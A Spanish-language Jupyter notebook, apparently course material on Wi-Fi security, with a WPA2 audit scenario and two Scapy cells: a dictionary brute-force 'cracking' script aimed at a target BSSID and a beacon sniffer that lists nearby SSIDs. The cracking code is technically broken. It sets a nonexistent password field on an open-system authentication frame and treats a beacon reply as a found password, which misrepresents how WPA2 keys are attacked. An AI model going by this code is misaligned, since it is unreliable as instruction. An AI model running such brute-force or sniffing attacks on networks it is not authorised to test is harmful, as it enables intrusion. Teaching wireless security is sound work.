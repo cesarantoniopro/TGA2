{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "source": [
        "# **Introucción:**\n",
        "\n",
        "La seguridad en redes inalámbricas es un aspecto crítico en la actualidad, dado el creciente uso de tecnologías Wi-Fi en entornos domésticos y empresariales. Con la evolución constante de las amenazas cibernéticas, es crucial comprender los posibles ataques a redes inalámbricas para poder implementar medidas preventivas eficaces.\n",
        "\n",
        "En este contexto, abordaremos dos aspectos clave: la autenticación y las técnicas de \"Cracking\", así como la utilización de \"Sniffers\" para encontrar SSID (Identificadores de Conjunto de Servicios)."
      ],
      "metadata": {
        "id": "fE6wYOFCQBJM"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "# **Caso Práctico:**\n",
        "\n",
        "Imaginemos una empresa que utiliza una red inalámbrica para proporcionar conectividad a sus empleados. Dicha red está protegida mediante un protocolo de seguridad, como WPA2, pero existe la necesidad de evaluar su resistencia a posibles ataques. En este escenario, un profesional de seguridad informática realiza una evaluación de seguridad para identificar posibles vulnerabilidades y mejorar la robustez de la red."
      ],
      "metadata": {
        "id": "HaEW7GJvQLid"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "# **Ejemplos de Codificación en Python:**\n",
        "\n",
        "**2.1.1. Autenticación y técnicas de \"Cracking\":**\n",
        "\n",
        "En este caso, se explorará la vulnerabilidad de una red Wi-Fi mediante el uso de herramientas de \"Cracking\" que intentan descifrar contraseñas. A continuación, se muestra un ejemplo simple de cómo un atacante podría usar Python y la biblioteca \"Scapy\" para realizar un ataque de fuerza bruta contra una red Wi-Fi:"
      ],
      "metadata": {
        "id": "8k7g3XhnQVzX"
      }
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "2g_HkceZP6Fn"
      },
      "outputs": [],
      "source": [
        "from scapy.all import *\n",
        "\n",
        "def crack_wifi_password(target_bssid, dictionary_file):\n",
        "    # Cargar lista de contraseñas desde el archivo\n",
        "    with open(dictionary_file, 'r') as file:\n",
        "        passwords = file.readlines()\n",
        "\n",
        "    # Crear paquete de autenticación\n",
        "    auth_packet = Dot11(type=0, subtype=11, addr1=\"ff:ff:ff:ff:ff:ff\", addr2=target_bssid, addr3=target_bssid) / Dot11Auth(algo=0, seqnum=1, status=0)\n",
        "\n",
        "    # Iterar sobre contraseñas e intentar autenticarse\n",
        "    for password in passwords:\n",
        "        auth_packet[Dot11Auth].psk = password.strip()\n",
        "        response = srp1(auth_packet, timeout=1, verbose=0)\n",
        "\n",
        "        if response and response.haslayer(Dot11Beacon):\n",
        "            print(f\"Contraseña encontrada: {password.strip()}\")\n",
        "            break\n",
        "    else:\n",
        "        print(\"Contraseña no encontrada en la lista proporcionada.\")\n",
        "\n",
        "# PROGRAMA PRINCIPAL\n",
        "\n",
        "crack_wifi_password(\"00:11:22:33:44:55\", \"lista_contraseñas.txt\")\n"
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "**2.1.2. Utilización de \"Sniffers\" para encontrar SSID:**\n",
        "\n",
        "En este ejemplo, exploraremos el uso de \"Sniffers\" para descubrir información sobre las redes Wi-Fi cercanas, incluyendo sus SSID. Utilizaremos la biblioteca \"Scapy\" para capturar y analizar los paquetes de la red:"
      ],
      "metadata": {
        "id": "cFwyfLerQtAN"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "from scapy.all import *\n",
        "\n",
        "def sniff_wifi_ssid():\n",
        "    # Función para manejar cada paquete recibido\n",
        "    def packet_handler(packet):\n",
        "        if packet.haslayer(Dot11Beacon):\n",
        "            ssid = packet[Dot11Elt].info.decode('utf-8')\n",
        "            print(f\"SSID encontrado: {ssid}\")\n",
        "\n",
        "    # Configurar el filtro para capturar solo paquetes de gestión de Wi-Fi\n",
        "    sniff(prn=packet_handler, store=0, iface=\"wlan0\", filter=\"type mgt subtype beacon\")\n",
        "\n",
        "# Uso del método\n",
        "sniff_wifi_ssid()\n"
      ],
      "metadata": {
        "id": "6gY0eBSqQv3I"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "**Instalar WinPcap o Npcap**\n",
        "\n",
        "Asegúrate de tener instalado uno de estos paquetes en tu sistema. Puedes descargar WinPcap desde winpcap.org o Npcap desde npcap.org. Después de la instalación, reinicia tu entorno de desarrollo (reinicia el script, terminal o IDE)."
      ],
      "metadata": {
        "id": "RN5VLWcjX8KT"
      }
    }
  ]
}